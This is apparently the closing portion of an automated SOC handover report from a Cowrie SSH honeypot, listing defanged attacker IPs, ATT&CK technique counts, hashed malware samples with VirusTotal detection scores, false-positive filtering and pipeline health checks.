| `120.48.130[.]213` | 1 | 2026-05-23 15:41 | 2026-05-23 15:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.198[.]130` | 1 | 2026-05-23 16:25 | 2026-05-23 16:25 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.40.112[.]10` | 1 | 2026-05-23 16:25 | 2026-05-23 16:25 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.231.89[.]148` | 1 | 2026-05-23 15:31 | 2026-05-23 15:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]193` | 1 | 2026-05-23 15:33 | 2026-05-23 15:33 | 2s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]234` | 1 | 2026-05-23 15:30 | 2026-05-23 15:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]236` | 1 | 2026-05-23 15:31 | 2026-05-23 15:31 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]238` | 1 | 2026-05-23 15:30 | 2026-05-23 15:30 | 10s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]245` | 1 | 2026-05-23 15:33 | 2026-05-23 15:33 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `118.196.142[.]135` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 1 |
| `91.231.89[.]236` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `14.103.114[.]89` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `91.231.89[.]148` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `91.231.89[.]193` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `14.1.16[.]230` | AU | Real World Technology Solutions Pty Ltd | **100** ⚠️ | 0 |
| `120.46.184[.]6` | CN | Huawei Public Cloud Service (Huawei Software Technologies Ltd.Co) | **100** ⚠️ | 8 |
| `179.40.112[.]10` | AR | Telefonica de Argentina | **100** ⚠️ | 50 |
| `14.29.198[.]130` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `115.190.151[.]242` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 33 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 50 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 16 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 11 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 780 cases |
| Tool 34  | Credential Extractor        | ✅ 27 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 29 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (0.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 11 priority case(s) shown individually · 23 recon entry/entries in table (9 group(s) consolidating 749 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-23T17:04:52Z_
